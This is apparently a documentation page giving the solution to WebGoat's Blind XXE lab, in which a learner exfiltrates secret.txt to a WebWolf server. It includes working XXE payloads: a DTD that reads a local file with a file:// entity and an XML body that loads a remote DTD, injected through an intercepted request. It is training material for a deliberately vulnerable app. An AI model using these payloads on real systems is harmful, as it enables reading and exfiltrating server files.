---
title: "A5:2021 | Security Misconfiguration (11) | Cycubix Docs"
layout: default
nav_order: 11
parent: "A5:2021 | Security Misconfiguration | Cycubix Docs"
grand_parent: "WebGoat Labs | Web Application Security Essentials | Cycubix Docs"
---
# A5:2021 | Security Misconfiguration (11) | Cycubix Docs

### Blind XXE assignment <a href="#blind_xxe_assignment" id="blind_xxe_assignment"></a>

In the previous page we showed you how you can ping a server with a XXE attack, in this assignment try to make a DTD which will upload the contents of a file secret.txt from the WebGoat server to our WebWolf server. You can use WebWolf to serve your DTD. The secret.txt is located on the WebGoat server in this location, so you do not need to scan all directories and files:

<table data-header-hidden><thead><tr><th width="185.5">OS</th><th>Location</th></tr></thead><tbody><tr><td>OS</td><td>Location</td></tr><tr><td><code>Linux</code></td><td><code>/home/webgoat/.webgoat-v8.0.0-SNAPSHOT//XXE/secret.txt</code></td></tr></tbody></table>

Try to upload this file using WebWolf landing page for example: [`http://localhost:9090/landing?text=contents_file`](http://localhost:9090/landing?text=contents_file) (NOTE: this endpoint is under your full control) Once you obtained the contents of the file post it as a new comment on the page and you will solve the lesson.

![](<../../../../.gitbook/assets/Screenshot 2020-04-28 at 16.24.18.png>)

#### Solution

* Hints: This assignment is more complicated you need to upload the contents of a file to the attackers site (WebWolf in this case) You cannot combine external entities in combination with internal entities.
* Use parameter entities to perform the attack, see for example: [https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/)
* An example DTD can be found \[\[webgoat base url]]/WebGoat/xxe/sampledtd, include this DTD in the xml comment.
* Use for the comment, be aware to replace the url accordingly: \[%remote;]>test\&send;
* Login to Webwolf. Upload **contents\_file.dtd** on **WebWolf**.

**With ZAP**

* Start WebGoat and WebWolf. 
* Save on a notepad the following file: 

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY secret SYSTEM 'file:////home/webgoat/.webgoat-2023.8//XXE/username/secret.txt'>
```

* Upload the DTD file to WebWolf. Once uploaded you will see the link address to access the file. 
* Add a comment on WebGoat and intercept the POST request. Send the request to editor: 
* Replace this section for the following code: 

```
<?xml version="1.0"?>
<!DOCTYPE lesson11 [
  <!ENTITY % lesson11dtd SYSTEM "http://localhost:9090/WebWolf/files/username/attack2.dtd">
  %lesson11dtd;
]>
<comment><text>lesson11comment &secret;</text></comment>
```

<figure><img src="../../../../.gitbook/assets/a5 10 post request.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/answer a5 11.png" alt=""><figcaption></figcaption></figure>

* We have added after defining the Entity Type, the link to the file uploadad in WebWolf. You can replace that path according to your own username. 
* Go back to WebGoat and post a comment. When we do that the webapp will load the content of the secret file. 

<figure><img src="../../../../.gitbook/assets/webgoatrocks.png" alt=""><figcaption></figcaption></figure>

